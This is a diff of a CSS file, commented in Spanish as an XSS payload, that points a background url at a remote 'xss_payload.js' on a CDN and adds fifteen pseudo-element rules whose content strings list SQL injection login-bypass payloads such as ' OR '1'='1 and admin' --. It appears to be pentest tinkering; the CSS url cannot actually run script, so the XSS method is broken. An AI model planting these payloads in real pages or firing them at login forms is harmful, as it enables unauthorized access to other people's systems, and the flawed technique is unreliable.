@@ -1,5 +1,52 @@
 /* Archivo: style.css */
 /* Carga útil para XSS */
 body {
-  background: url("https://cdn.jsdelivr.net/gh/saheredelgadom/Test@main/xss_payload_js.js");
+  background: url("https://cdn.jsdelivr.net/gh/tuusuario/pentest/xss_payload.js");
+}
+
+/* Ejemplo de carga útil en comentarios */
+body::before {
+  content: "/* SQL Injection Payload 1: ' OR '1'='1 */";
+}
+body::after {
+  content: "/* SQL Injection Payload 2: ' OR '1'='1' -- */";
+}
+div::before {
+  content: "/* SQL Injection Payload 3: ' OR '1'='1' /* */";
+}
+div::after {
+  content: "/* SQL Injection Payload 4: admin' -- */";
+}
+span::before {
+  content: "/* SQL Injection Payload 5: admin' /* */";
+}
+span::after {
+  content: "/* SQL Injection Payload 6: ' OR 'a'='a */";
+}
+p::before {
+  content: "/* SQL Injection Payload 7: ' OR '1'='1' OR ''=' */";
+}
+p::after {
+  content: "/* SQL Injection Payload 8: ' OR 1=1 -- */";
+}
+h1::before {
+  content: "/* SQL Injection Payload 9: ' OR 1=1 /* */";
+}
+h1::after {
+  content: "/* SQL Injection Payload 10: ' OR 1=1 -- - */";
+}
+h2::before {
+  content: "/* SQL Injection Payload 11: ' OR ' ' = ' */";
+}
+h2::after {
+  content: "/* SQL Injection Payload 12: ' OR ' ' = ' ' */";
+}
+h3::before {
+  content: "/* SQL Injection Payload 13: ' = ' */";
+}
+h3::after {
+  content: "/* SQL Injection Payload 14: ' LIKE '%' */";
+}
+h4::before {
+  content: "/* SQL Injection Payload 15: ' HAVING 1=1 -- */";
 }
